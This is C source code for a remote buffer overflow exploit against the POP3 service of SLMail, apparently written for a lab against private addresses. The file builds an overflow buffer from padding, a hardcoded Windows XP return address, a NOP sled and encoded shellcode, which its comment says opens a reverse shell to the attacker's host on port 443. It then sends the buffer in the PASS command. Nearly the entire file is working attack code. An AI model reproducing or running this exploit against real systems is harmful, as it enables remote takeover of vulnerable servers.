#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <errno.h>
#include <netinet/in.h>
#include <netdb.h>
#include <string.h>
 
#define retadd "\x8f\x35\x4a\x5f" /* winXP sp3 pt-br 0x5f4a358f*/
#define port 110

/* revshell 192.168.0.106:443 */
char shellcode[] =
"\xfc\xbb\x05\x5f\x2e\x11\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
"\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\xf9\xb7\xac\x11\x01"
"\x48\xd1\x98\xe4\x79\xd1\xff\x6d\x29\xe1\x74\x23\xc6\x8a\xd9"
"\xd7\x5d\xfe\xf5\xd8\xd6\xb5\x23\xd7\xe7\xe6\x10\x76\x64\xf5"
"\x44\x58\x55\x36\x99\x99\x92\x2b\x50\xcb\x4b\x27\xc7\xfb\xf8"
"\x7d\xd4\x70\xb2\x90\x5c\x65\x03\x92\x4d\x38\x1f\xcd\x4d\xbb"
"\xcc\x65\xc4\xa3\x11\x43\x9e\x58\xe1\x3f\x21\x88\x3b\xbf\x8e"
"\xf5\xf3\x32\xce\x32\x33\xad\xa5\x4a\x47\x50\xbe\x89\x35\x8e"
"\x4b\x09\x9d\x45\xeb\xf5\x1f\x89\x6a\x7e\x13\x66\xf8\xd8\x30"
"\x79\x2d\x53\x4c\xf2\xd0\xb3\xc4\x40\xf7\x17\x8c\x13\x96\x0e"
"\x68\xf5\xa7\x50\xd3\xaa\x0d\x1b\xfe\xbf\x3f\x46\x97\x0c\x72"
"\x78\x67\x1b\x05\x0b\x55\x84\xbd\x83\xd5\x4d\x18\x54\x19\x64"
"\xdc\xca\xe4\x87\x1d\xc3\x22\xd3\x4d\x7b\x82\x5c\x06\x7b\x2b"
"\x89\x89\x2b\x83\x62\x6a\x9b\x63\xd3\x02\xf1\x6b\x0c\x32\xfa"
"\xa1\x25\xd9\x01\x22\x8a\xb6\x09\xd8\x62\xc5\x09\x1d\xc8\x40"
"\xef\x77\x3e\x05\xb8\xef\xa7\x0c\x32\x91\x28\x9b\x3f\x91\xa3"
"\x28\xc0\x5c\x44\x44\xd2\x09\xa4\x13\x88\x9c\xbb\x89\xa4\x43"
"\x29\x56\x34\x0d\x52\xc1\x63\x5a\xa4\x18\xe1\x76\x9f\xb2\x17"
"\x8b\x79\xfc\x93\x50\xba\x03\x1a\x14\x86\x27\x0c\xe0\x07\x6c"
"\x78\xbc\x51\x3a\xd6\x7a\x08\x8c\x80\xd4\xe7\x46\x44\xa0\xcb"
"\x58\x12\xad\x01\x2f\xfa\x1c\xfc\x76\x05\x90\x68\x7f\x7e\xcc"
"\x08\x80\x55\x54\x38\xcb\xf7\xfd\xd1\x92\x62\xbc\xbf\x24\x59"
"\x83\xb9\xa6\x6b\x7c\x3e\xb6\x1e\x79\x7a\x70\xf3\xf3\x13\x15"
"\xf3\xa0\x14\x3c\xf3\x46\xeb\xbf";
 
struct sockaddr_in plm,lar,target;

int conn(char *ip) {
    int sockfd;
    plm.sin_family = AF_INET;
    plm.sin_port = htons(port);
    plm.sin_addr.s_addr = inet_addr(ip);
    bzero(&(plm.sin_zero),8);
    sockfd = socket(AF_INET,SOCK_STREAM,0);
    
    if((connect(sockfd,(struct sockaddr *)&plm,sizeof(struct sockaddr))) < 0)
    {
        perror("[-] connect error!");
        exit(0);
    }

    printf("[*] Connected to: %s.\n",ip);
    return sockfd;
}

int main(int argc, char *argv[]) {
    int xs;
    char out[1024];
    char *buffer = malloc(2960);

    memset(buffer, 0x00, 2960);

    char *off = malloc(2607);
    memset(off, 0x00, 2607);
    memset(off, 0x41, 2606);

    char *nop = malloc(13);
    memset(nop, 0x00, 13);
    memset(nop, 0x90, 12);

    strcat(buffer, off);
    strcat(buffer, retadd);
    strcat(buffer, nop);
    strcat(buffer, shellcode);

    printf("[+] SLMAIL Remote buffer overflow exploit in POP3 PASS by Haroon Rashid Astwat.\n");
    xs = conn("192.168.0.102");
    read(xs, out, 1024);
    printf("[*] %s", out);
    write(xs,"USER username\r\n", 15);
    read(xs, out, 1024);
    printf("[*] %s", out);
    write(xs,"PASS ",5);
    write(xs,buffer,strlen(buffer));
    printf("Shellcode len: %d bytes\n",strlen(shellcode));
    printf("Buffer len: %d bytes\n",strlen(buffer));
    write(xs,"\r\n",4);
    close(xs);
}